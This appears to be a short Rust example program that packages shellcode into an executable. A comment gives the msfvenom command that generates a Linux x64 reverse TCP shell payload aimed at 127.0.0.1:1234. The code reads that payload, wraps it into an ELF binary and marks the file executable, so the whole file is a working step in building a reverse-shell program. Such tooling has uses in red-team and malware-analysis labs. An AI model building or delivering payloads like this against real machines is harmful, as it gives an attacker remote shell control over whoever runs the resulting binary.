use std::env::current_dir;
use std::fs::{self, File};
use std::io::Write;
use std::os::unix::fs::PermissionsExt;

use exeutils::elf64;

fn main() {
    let path = current_dir().unwrap();
    let cwd = path.display();

    // Shellcode:
    // msfvenom --payload 'linux/x64/shell_reverse_tcp' LHOST=127.0.0.1 LPORT=1234 --format 'raw' --platform 'linux' --arch 'x64' --out linux-x64-shell_reverse_tcp.bin
    let shellcode_path = format!("{}/assets/linux-x64-shell_reverse_tcp.bin", cwd);

    let shellcode_bytes = fs::read(shellcode_path).expect("Failed to open file");

    let elf_bytes = elf64::shellcode_to_exe(&shellcode_bytes);

    let elf_path = format!("{}/assets/converted_elf", cwd);

    let mut file = File::create(&elf_path).unwrap();
    file.write_all(&elf_bytes).unwrap();
    fs::set_permissions(&elf_path, fs::Permissions::from_mode(0o755)).unwrap();
}
